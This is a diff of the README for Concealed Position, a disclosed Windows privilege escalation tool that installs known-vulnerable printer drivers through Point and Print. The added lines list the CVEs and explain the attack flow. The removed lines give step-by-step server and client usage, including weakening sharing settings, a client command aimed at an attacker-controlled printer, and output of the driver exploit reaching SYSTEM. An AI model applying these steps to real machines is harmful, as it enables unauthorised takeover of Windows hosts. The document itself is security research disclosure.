@@ -1,131 +1,40 @@
 # Concealed Position
 
-Concealed Position is a local privilege escalation attack against Windows using the concept of "Bring Your Own Vulnerability". Specifically, CP uses the Point and Print logic in Windows that allows a low privilege user to stage and install printer drivers. CP then exploits the installed driver to escalate to SYSTEM. Concealed Position was first presented at DEF CON 29.
+Concealed Position is a local privilege escalation attack against Windows using the concept of "Bring Your Own Vulnerability". Specifically, Concealed Position (CP) uses the *as designed* package point and print logic in Windows that allows a low privilege user to stage and install printer drivers. CP specifically installs drivers with known vulnerabilities which are then exploited to escalate to SYSTEM. Concealed Position was first presented at DEF CON 29.
+
+## What exploits are available
+Concealed Position offers four exploits - all with equally dumb names:
+
+* ACIDDAMAGE - [CVE-2021-35449](https://nvd.nist.gov/vuln/detail/CVE-2021-35449) - Lexmark Universal Print Driver LPE
+* RADIANTDAMAGE - [CVE-2021-38085](https://nvd.nist.gov/vuln/detail/CVE-2021-38085) - Canon TR150 Print Driver LPE
+* POISONDAMAGE - [CVE-2019-19363](https://nvd.nist.gov/vuln/detail/CVE-2019-19363) - Ricoh PCL6 Print Driver LPE
+* SLASHINGDAMAGE - [CVE-2020-1300](https://nvd.nist.gov/vuln/detail/CVE-2020-1300) - Windows Print Spooler LPE
+
+The exploits are neat because, besides SLASHINGDAMAGE, they will continue working even after the issues are patched. The only mechanism Windows has to stop users from using old drivers is to revoke the driver's certificate - something that is not(?) historically done.
 
 ## How does it work?
-Concealed Position has two parts. A server (pretending to be a printer) and a client (which will do the LPE). The client reaches out to the server, grabs a driver, gets the driver stored in the driver store, installs the printer, and exploits the install process. Easy!
-
-## I want to add to this!
-Cool! Should be pretty easy. The only hard part is that the printer driver must be packaged into a CAB file.
-
-## How do I use this super neat tool?
-
-Let's walk through a step by step guide.
-
-### Server (evil printer) Usage 
-To start we prepare the server. It must be a Windows box and it is assumed the attacker has admin privs on this box.
-
-1. Copy the 3rdparty directory onto the Windows box.
-2. Copy the cp_server binary (from the bin directory) onto the Windows box.
-3. Copy the cab_files directory (from the Windows box) onto the Windows box.
-4. From the 3rdparty directory, run converter.exe.
-5. From the 3rdparty directory, run CuteWriter.exe.
-6. As Administrator, run cp_server.exe. Ensure that the cab_files directory is in the same directory as cp_server.exe. The output should look like this:
+Concealed Position has two parts. An evil printer and a client. The client reaches out to the server, grabs a driver, gets the driver stored in the driver store, installs the printer, and exploits the install process. Easy! In MSAPI speak, the attack goes something like this:
 
 ```
-C:\Users\albinolobster\Desktop>cp_server.exe -h
-CLI options:
-  -h, --help         Display the help message
-  -e, --exploit arg  The exploit to use
+Step 1: Stage the driver in the driver store
+client to server: GetPrinterDriver
+server to client: Response with driver
 
-Exploits available:
-        ACIDDAMAGE
-        POISONDAMAGE
-        RADIANTDAMAGE
+Stage 2: Install the driver from the driver store
+client: InstallPrinterDriverFromPackage
 
-C:\Users\albinolobster\Desktop>cp_server.exe -e ACIDDAMAGE
-[+] Checking CutePDF Writer is installed
-[+] Staging ACIDDAMAGE files
-[+] Opening CutePDF Writer registry for writing
-[+] Setting PrinterDriverAttributes
-[+] Setting InfPath
-[+] Done.
-[!] MANUAL STEPS!
-[1] Set CutePDF Writer as a shared printer
-[2] In Advanced Sharing Settings, Turn on file and printer sharing.
-[3] In Advanced Sharing Settings, Turn off password protected sharing.
-[4] Reboot
-
-C:\Users\albinolobster\Desktop>
+Stage 3: Add a local printer (exploitation stage)
+client: Add printer
 ```
 
-7. Set CutePDF Writer as a shared printer (Printer & Scanners -> CutePDF Writer -> Manage -> Printer Properties -> Sharing -> Share this printer)
-8. Enable File and Printer sharing (Manage advanced sharing settings -> Guest or Public -> Turn on file and printer sharing)
-9. Disable password protected sharing (Manage advanced sharing settings -> All Networks -> Turn off password protected sharing)
-10. Reboot
+It is important to note that SLASHINGDAMAGE doesn't actually work like that though. SLASHINGDAMAGE is an implementation of the evil printer attack described at DEFCON 28 (2020) and has long since been patched. I just so happen to enjoy the attack (it sparked the rest of this development) and figured I'd leave the exploit in my evil server... as confusing as that may be.
 
-### Client Usage
+## Is this a Windows vulnerability?
+Arguably, yes. The driver store is a ["trusted collection of ... third-party driver packages"](https://docs.microsoft.com/en-us/windows-hardware/drivers/install/driver-store) that requires administrator access to modify. Using `GetPrinterDriver` a low privileged attacker can stage arbitrary drivers into the store. This, to me, is a clear security boundary.
 
-Client is assumed to be a low privileged user on a Windows box.
+Microsoft seemed to agree when they issued [CVE-2021-34481](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-34481).
 
-1. Copy cp_client.exe to the machine (from bin directory).
-2. Provide cp_client.exe with: the evil printer to connect to (-r), the name of the evil printer (-n), and the expected driver (-e).
-
-```
-C:\Users\lowlevel\Desktop>cp_client.exe -h
- _______  _______  __    _  _______  _______  _______  ___      _______  ______
-|       ||       ||  |  | ||       ||       ||   _   ||   |    |       ||      |
-|       ||   _   ||   |_| ||       ||    ___||  |_|  ||   |    |    ___||  _    |
-|       ||  | |  ||       ||       ||   |___ |       ||   |    |   |___ | | |   |
-|      _||  |_|  ||  _    ||      _||    ___||       ||   |___ |    ___|| |_|   |
-|     |_ |       || | |   ||     |_ |   |___ |   _   ||       ||   |___ |       |
-|_______||_______||_|  |__||_______||_______||__| |__||_______||_______||______|
- _______  _______  _______  ___   _______  ___   _______  __    _
-|       ||       ||       ||   | |       ||   | |       ||  |  | |
-|    _  ||   _   ||  _____||   | |_     _||   | |   _   ||   |_| |
-|   |_| ||  | |  || |_____ |   |   |   |  |   | |  | |  ||       |
-|    ___||  |_|  ||_____  ||   |   |   |  |   | |  |_|  ||  _    |
-|   |    |       | _____| ||   |   |   |  |   | |       || | |   |
-|___|    |_______||_______||___|   |___|  |___| |_______||_|  |__|
-
-CLI options:
-  -h, --help         Display the help message
-  -r, --rhost arg    The remote evil printer address
-  -n, --name arg     The remote evil printer name
-  -e, --exploit arg  The exploit to use
-
-Exploits available:
-        ACIDDAMAGE
-        POISONDAMAGE
-        RADIANTDAMAGE
-C:\Users\lowlevel\Desktop>cp_client.exe -r 192.168.237.176 -n "CutePDF Writer" -e ACIDDAMAGE
- _______  _______  __    _  _______  _______  _______  ___      _______  ______
-|       ||       ||  |  | ||       ||       ||   _   ||   |    |       ||      |
-|       ||   _   ||   |_| ||       ||    ___||  |_|  ||   |    |    ___||  _    |
-|       ||  | |  ||       ||       ||   |___ |       ||   |    |   |___ | | |   |
-|      _||  |_|  ||  _    ||      _||    ___||       ||   |___ |    ___|| |_|   |
-|     |_ |       || | |   ||     |_ |   |___ |   _   ||       ||   |___ |       |
-|_______||_______||_|  |__||_______||_______||__| |__||_______||_______||______|
- _______  _______  _______  ___   _______  ___   _______  __    _
-|       ||       ||       ||   | |       ||   | |       ||  |  | |
-|    _  ||   _   ||  _____||   | |_     _||   | |   _   ||   |_| |
-|   |_| ||  | |  || |_____ |   |   |   |  |   | |  | |  ||       |
-|    ___||  |_|  ||_____  ||   |   |   |  |   | |  |_|  ||  _    |
-|   |    |       | _____| ||   |   |   |  |   | |       || | |   |
-|___|    |_______||_______||___|   |___|  |___| |_______||_|  |__|
-
-[+] Checking if driver is already installed
-[-] Driver is not available.
-[+] Call back to evil printer @ \\192.168.237.176\CutePDF Writer
-[+] Staging driver in driver store
-[+] Driver staged!
-[+] Installing the staged driver
-[+] Driver installed!
-[+] Starting ACIDDAMAGE
-[+] Checking if C:\ProgramData\Lexmark Universal v2\ exists
-[-] Target directory doesn't exist. Trigger install.
-[+] Installing printer
-[+] Read in C:\ProgramData\Lexmark Universal v2\Universal Color Laser.gdl
-[+] Searching file contents
-[+] Updating file contents
-[+] Dropping updated gpl
-[+] Dropping dll to disk
-[+] Installing printer
-
-C:\Users\lowlevel\Desktop>
-```
-
-3. The exploit should automatically run. On success, the "inject_me" binary is loaded with SYSTEM privileges. As this is a simple PoC it simply executes "WinExec("cmd.exe /c whoami > c:\\result.txt", SW_HIDE);"
+Although... it's arguable that this is simply a feature of the system and not a vulnerability at all. It really doesn't matter all that much. An attacker can escalate to SYSTEM on standard Windows installs.
 
 ### Other things
 
